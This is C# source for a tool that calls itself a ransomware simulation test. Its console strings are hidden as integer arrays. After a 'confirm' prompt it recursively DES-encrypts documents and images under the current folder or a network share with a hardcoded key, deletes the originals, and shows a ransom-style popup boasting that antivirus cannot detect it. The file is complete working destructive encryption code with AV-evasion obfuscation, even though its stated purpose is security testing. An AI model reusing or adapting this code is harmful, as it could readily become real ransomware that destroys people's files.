using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Security;
using System.Security.Cryptography;
using System.Runtime.InteropServices;
using System.Collections;
using System.Diagnostics;
using System.Security.AccessControl;
using System.Globalization;
using System.Text.RegularExpressions;

namespace EncryptDelTestv3
{
    public static class GlobalVar
    {
        public static string sSecretKey = "";
        public static string myargs = "";
        public static string choose = "";
        public static int encryptedcount = 0;
    }

    class Program
    {
        static void Main(string[] args)
        {
            int[] CharNum = { 91, 69, 110, 99, 114, 121, 112, 116, 32, 68, 101, 108, 101, 116, 101, 32, 84, 101, 115, 116, 32, 118, 51, 93 };
            Console.WriteLine(NumtoString(CharNum));
            CharNum = new int[] { 83, 105, 109, 117, 108, 97, 116, 101, 32, 114, 97, 110, 115, 111, 109, 119, 97, 114, 101, 32, 101, 110, 99, 114, 121, 112, 116, 105, 111, 110, 32, 111, 112, 101, 114, 97, 116, 105, 111, 110 };
            Console.WriteLine(NumtoString(CharNum));
            CharNum = new int[] { 66, 121, 32, 69, 100, 100, 105, 101, 32, 67, 104, 117, 32, 101, 100, 100, 105, 101, 99, 104, 117, 46, 97, 110, 100, 114, 111, 105, 100, 64, 103, 109, 97, 105, 108, 46, 99, 111, 109 };
            Console.WriteLine(NumtoString(CharNum));
            CharNum = new int[] { 80, 108, 101, 97, 115, 101, 32, 100, 111, 119, 110, 108, 111, 97, 100, 32, 116, 104, 101, 32, 111, 114, 105, 103, 105, 110, 97, 108, 32, 97, 110, 100, 32, 108, 97, 116, 101, 115, 116, 32, 118, 101, 114, 115, 105, 111, 110, 32, 102, 114, 111, 109, 32, 103, 105, 116, 104, 117, 98, 46, 99, 111, 109, 47, 101, 100, 100, 105, 101, 99, 104, 117, 47, 69, 110, 99, 114, 121, 112, 116, 45, 68, 101, 108, 101, 116, 101, 45, 84, 101, 115, 116 };
            Console.WriteLine(NumtoString(CharNum));
            CharNum = new int[] { 86, 101, 114, 115, 105, 111, 110, 32, 118, 51, 46, 48, 46, 53, 32, 40, 50, 57, 47, 65, 117, 103, 47, 50, 48, 50, 49, 41 };
            Console.WriteLine(NumtoString(CharNum));
            Console.WriteLine("");
            CharNum = new int[] { 84, 104, 105, 115, 32, 116, 111, 111, 108, 32, 101, 110, 99, 114, 121, 112, 116, 32, 116, 104, 101, 32, 102, 105, 108, 101, 32, 117, 110, 100, 101, 114, 32, 99, 117, 114, 114, 101, 110, 116, 32, 102, 111, 108, 100, 101, 114, 32, 97, 110, 100, 32, 105, 116, 39, 115, 32, 115, 117, 98, 102, 111, 108, 100, 101, 114, 40, 115, 41, 41 };
            Console.WriteLine(NumtoString(CharNum));
            Console.WriteLine("");
            CharNum = new int[] { 91, 67, 97, 117, 116, 105, 111, 110, 93 };
            Console.WriteLine(NumtoString(CharNum));
            CharNum = new int[] { 89, 111, 117, 32, 117, 115, 101, 32, 116, 104, 105, 115, 32, 116, 111, 111, 108, 32, 99, 111, 109, 112, 108, 101, 116, 101, 108, 121, 32, 97, 116, 32, 121, 111, 117, 114, 32, 111, 119, 110, 32, 114, 105, 115, 107, 46 };
            Console.WriteLine(NumtoString(CharNum));
            Console.WriteLine("");
            do
            {
                CharNum = new int[] { 91, 79, 112, 116, 105, 111, 110, 115, 93 };
                Console.WriteLine(NumtoString(CharNum));
                CharNum = new int[] { 62, 99, 111, 110, 102, 105, 114, 109, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 69, 110, 99, 114, 121, 112, 116, 32, 99, 117, 114, 114, 101, 110, 116, 32, 102, 111, 108, 100, 101, 114, 32, 40, 116, 101, 115, 116, 32, 116, 104, 105, 115, 32, 99, 111, 109, 112, 117, 116, 101, 114, 41 };
                Console.WriteLine(NumtoString(CharNum));
                CharNum = new int[] { 62, 99, 111, 110, 102, 105, 114, 109, 32, 34, 78, 58, 92, 70, 111, 108, 100, 101, 114, 34, 32, 32, 32, 32, 32, 69, 110, 99, 114, 121, 112, 116, 32, 110, 101, 116, 119, 111, 114, 107, 32, 115, 104, 97, 114, 101, 32, 40, 116, 101, 115, 116, 32, 102, 105, 108, 101, 32, 115, 101, 114, 118, 101, 114, 41 };
                Console.WriteLine(NumtoString(CharNum));
                CharNum = new int[] { 80, 108, 101, 97, 115, 101, 32, 116, 121, 112, 101, 32, 116, 104, 101, 32, 111, 112, 116, 105, 111, 110, 58, 32, 62 };
                Console.WriteLine(NumtoString(CharNum));
                GlobalVar.choose = Console.ReadLine();
                CharNum = new int[] { 99, 111, 110, 102, 105, 114, 109 };
            } while (!GlobalVar.choose.StartsWith(NumtoString(CharNum)));

            Console.WriteLine("");
            String specifiedpath;
            specifiedpath = "";
            if (GlobalVar.choose.StartsWith(NumtoString(CharNum)))
            {
                var collection = Regex.Matches(GlobalVar.choose, "\".*?\"");
                foreach (var item in collection)
                {
                    specifiedpath = item.ToString().Trim('"');
                    Console.WriteLine("Specified Path is " + specifiedpath);
                }
                GlobalVar.choose = "1";
            }

            GlobalVar.sSecretKey = GenerateKey();
            GlobalVar.sSecretKey = "enckey98";
            GCHandle gch = GCHandle.Alloc(GlobalVar.sSecretKey, GCHandleType.Pinned);

            string path;
            if (string.IsNullOrEmpty(specifiedpath))
            {
                path = @System.IO.Directory.GetCurrentDirectory();
            }
            else
            {
                path = specifiedpath;
            }
            if (File.Exists(path))
            {
                ProcessFile(path);
            }
            else if (Directory.Exists(path))
            {
                ProcessDirectory(path);
            }
            else
            {
                Console.WriteLine("{0} is not a valid file or directory.", path);
            }

            String encryptionkey;
            encryptionkey = GlobalVar.sSecretKey + " ";
            ZeroMemory(gch.AddrOfPinnedObject(), GlobalVar.sSecretKey.Length * 2);
            gch.Free();

            if (GlobalVar.encryptedcount > 0)
            {
                using (System.IO.StreamWriter file = new System.IO.StreamWriter(@"popup.html"))
                {
                    CharNum = new int[] { 60, 104, 116, 109, 108, 62 };
                    file.WriteLine(NumtoString(CharNum));
                    CharNum = new int[] { 60, 104, 101, 97, 100, 62 };
                    file.WriteLine(NumtoString(CharNum));
                    CharNum = new int[] { 60, 116, 105, 116, 108, 101, 62, 69, 110, 99, 114, 121, 112, 116, 68, 101, 108, 84, 101, 115, 116, 118, 51, 60, 47, 116, 105, 116, 108, 101, 62 };
                    file.WriteLine(NumtoString(CharNum));

                    CharNum = new int[] { 60, 98, 111, 100, 121, 32, 98, 103, 99, 111, 108, 111, 114, 61, 114, 101, 100, 62 };
                    file.WriteLine(NumtoString(CharNum));
                    CharNum = new int[] { 60, 102, 111, 110, 116, 32, 115, 105, 122, 101, 61, 43, 49, 48, 32, 99, 111, 108, 111, 114, 61, 119, 104, 105, 116, 101, 62, 60, 98, 62, 91, 69, 110, 99, 114, 121, 112, 116, 68, 101, 108, 84, 101, 115, 116, 118, 51, 93, 60, 47, 98, 62, 60, 47, 102, 111, 110, 116, 62, 60, 98, 114, 62, 60, 98, 114, 62, 60, 98, 114, 62, 60, 98, 114, 62 };
                    file.WriteLine(NumtoString(CharNum));
                    CharNum = new int[] { 60, 102, 111, 110, 116, 32, 115, 105, 122, 101, 61, 43, 49, 48, 32, 99, 111, 108, 111, 114, 61, 119, 104, 105, 116, 101, 62, 89, 111, 117, 114, 32, 97, 110, 116, 105, 45, 118, 105, 114, 117, 115, 32, 115, 111, 102, 116, 119, 97, 114, 101, 32, 60, 117, 62, 67, 65, 78, 78, 79, 84, 60, 47, 117, 62, 32, 100, 101, 116, 101, 99, 116, 32, 116, 104, 105, 115, 32, 116, 101, 115, 116, 60, 47, 102, 111, 110, 116, 62, 60, 98, 114, 62, 60, 98, 114, 62 };
                    file.WriteLine(NumtoString(CharNum));
                    CharNum = new int[] { 60, 98, 114, 62 };
                    file.WriteLine(NumtoString(CharNum));
                    file.WriteLine(NumtoString(CharNum));
                    CharNum = new int[] { 60, 98, 114, 62, 69, 110, 99, 114, 121, 112, 116, 105, 111, 110, 32, 75, 101, 121, 58, 32 };
                    file.WriteLine(NumtoString(CharNum) + encryptionkey);
                    CharNum = new int[] { 60, 98, 114, 62, 69, 110, 99, 114, 121, 112, 116, 101, 100, 32, 70, 105, 108, 101, 58, 32 };
                    file.WriteLine(NumtoString(CharNum) + GlobalVar.encryptedcount);
                    CharNum = new int[] { 60, 98, 114, 62, 80, 97, 116, 104, 58, 32 };
                    file.WriteLine(NumtoString(CharNum) + path);
                    CharNum = new int[] { 60, 98, 114, 62 };
                    file.WriteLine(NumtoString(CharNum) + DateTime.Now);
                    file.WriteLine(NumtoString(CharNum));
                    CharNum = new int[] { 60, 47, 98, 111, 100, 121, 62 };
                    file.WriteLine(NumtoString(CharNum));
                    CharNum = new int[] { 60, 47, 104, 116, 109, 108, 62 };
                    file.WriteLine(NumtoString(CharNum));
                }
                Process.Start(@"popup.html");
                Console.WriteLine("");
                Console.WriteLine("");
                CharNum = new int[] { 69, 110, 99, 114, 121, 112, 116, 105, 111, 110, 32, 75, 101, 121, 58, 32 };
                Console.WriteLine(NumtoString(CharNum) + encryptionkey);
                CharNum = new int[] { 69, 110, 99, 114, 121, 112, 116, 101, 100, 32, 70, 105, 108, 101, 58, 32 };
                Console.WriteLine(NumtoString(CharNum) + GlobalVar.encryptedcount);
                CharNum = new int[] { 89, 111, 117, 114, 32, 97, 110, 116, 105, 45, 118, 105, 114, 117, 115, 32, 115, 111, 102, 116, 119, 97, 114, 101, 32, 67, 65, 78, 78, 79, 84, 32, 100, 101, 116, 101, 99, 116, 32, 116, 104, 105, 115, 32, 116, 101, 115, 116 };
                Console.WriteLine(NumtoString(CharNum));
            }
            else
            {
                CharNum = new int[] { 78, 111, 32, 102, 105, 108, 101, 32, 105, 115, 32, 102, 111, 117, 110, 100, 32, 111, 114, 32, 101, 110, 99, 114, 121, 112, 116, 101, 100 };
                Console.WriteLine(NumtoString(CharNum));
            }
            Console.WriteLine("");
            Console.WriteLine("Press any key to continue . . .");
            Console.ReadKey();
        }

        [System.Runtime.InteropServices.DllImport("KERNEL32.DLL", EntryPoint = "RtlZeroMemory")]
        public static extern bool ZeroMemory(IntPtr Destination, int Length);

        static string GenerateKey()
        {
            DESCryptoServiceProvider desCrypto = (DESCryptoServiceProvider)DESCryptoServiceProvider.Create();
            return ASCIIEncoding.ASCII.GetString(desCrypto.Key);
        }

        static string NumtoString(int[] NumArray)
        {
            String result;
            result = "";
            foreach (int i in NumArray)
            {
                result += ((char)i).ToString();
            }
            return result;
        }

        static void EncryptFileDES(string sInputFilename,
           string sOutputFilename,
           string sKey)
        {
            FileStream fsInput = new FileStream(sInputFilename,
               FileMode.Open,
               FileAccess.Read);

            FileStream fsEncrypted = new FileStream(sOutputFilename,
               FileMode.Create,
               FileAccess.Write);
            DESCryptoServiceProvider DES = new DESCryptoServiceProvider();
            DES.Key = ASCIIEncoding.ASCII.GetBytes(sKey);
            DES.IV = ASCIIEncoding.ASCII.GetBytes(sKey);
            ICryptoTransform desencrypt = DES.CreateEncryptor();
            CryptoStream cryptostream = new CryptoStream(fsEncrypted,
               desencrypt,
               CryptoStreamMode.Write);

            byte[] bytearrayinput = new byte[fsInput.Length];
            fsInput.Read(bytearrayinput, 0, bytearrayinput.Length);
            cryptostream.Write(bytearrayinput, 0, bytearrayinput.Length);
            cryptostream.Close();
            fsInput.Close();
            fsEncrypted.Close();
            GlobalVar.encryptedcount = GlobalVar.encryptedcount + 1;
        }

        public static void ProcessDirectory(string targetDirectory)
        {
            String supportedfileextensions;
            int[] CharNum = { 42, 46, 100, 111, 99, 44, 42, 46, 100, 111, 99, 120, 44, 42, 46, 120, 108, 115, 44, 42, 46, 120, 108, 115, 120, 44, 42, 46, 116, 120, 116, 44, 42, 46, 114, 116, 102, 44, 42, 46, 112, 100, 102, 44, 42, 46, 106, 112, 103, 44, 42, 46, 106, 112, 101, 103, 44, 42, 46, 103, 105, 102, 44, 42, 46, 98, 109, 112, 44, 42, 46, 112, 110, 103 };
            supportedfileextensions = NumtoString(CharNum);
            string[] fileEntries = Directory.GetFiles(targetDirectory);
            foreach (string fileName in fileEntries)
            {
                if (supportedfileextensions.Contains(Path.GetExtension(fileName)))
                {
                    ProcessFile(fileName);
                }
            }

            // Recurse into subdirectories of this directory.
            string[] subdirectoryEntries = Directory.GetDirectories(targetDirectory);
            foreach (string subdirectory in subdirectoryEntries)
                ProcessDirectory(subdirectory);
        }

        public static void ProcessFile(string path)
        {
            Console.WriteLine("");
            int[] CharNum = { 110, 99, 114, 121, 112, 116 };
            Console.WriteLine("E" + NumtoString(CharNum) + " to '{0}'", path + ".e" + NumtoString(CharNum) + "ed");

            string newfileext;

            newfileext = ".e" + NumtoString(CharNum) + "ed";
            EncryptFileDES(@path, @path + newfileext, GlobalVar.sSecretKey);

            Console.WriteLine("Delete '{0}'", path);
            if (GlobalVar.choose == "1b" || GlobalVar.choose == "2b")
            {
                Console.WriteLine("Overwrite '{0}'", path);
                File.Copy(path + newfileext, path, true);
                File.Copy(path, path + newfileext, true);
            }
            File.Delete(path);
            Console.Write("'" + path + "' ");
            Console.WriteLine(File.Exists(path) ? "File exists." : "File does not exist.");
        }

        public static byte[] GenerateRandomSalt()
        {
            byte[] data = new byte[32];

            using (RNGCryptoServiceProvider rng = new RNGCryptoServiceProvider())
            {
                for (int i = 0; i < 10; i++)
                {
                    rng.GetBytes(data);
                }
            }

            return data;
        }

    }
}
